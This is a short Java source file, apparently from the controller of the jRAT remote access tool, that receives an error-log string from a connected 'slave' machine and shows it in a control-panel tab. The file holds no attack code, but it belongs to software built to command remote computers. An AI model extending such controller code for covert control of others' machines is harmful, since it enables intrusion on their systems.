package io.jrat.controller.packets.incoming;

import io.jrat.controller.Slave;
import io.jrat.controller.ui.frames.FrameControlPanel;
import io.jrat.controller.ui.panels.PanelControlErrorLog;
import java.io.DataInputStream;


public class Packet65ErrorLog extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String trace = slave.readLine();

		FrameControlPanel frame = FrameControlPanel.instances.get(slave);

		if (frame != null) {
			PanelControlErrorLog panel = (PanelControlErrorLog) frame.panels.get("error log");

			panel.getPane().setText(trace);
		}
	}

}
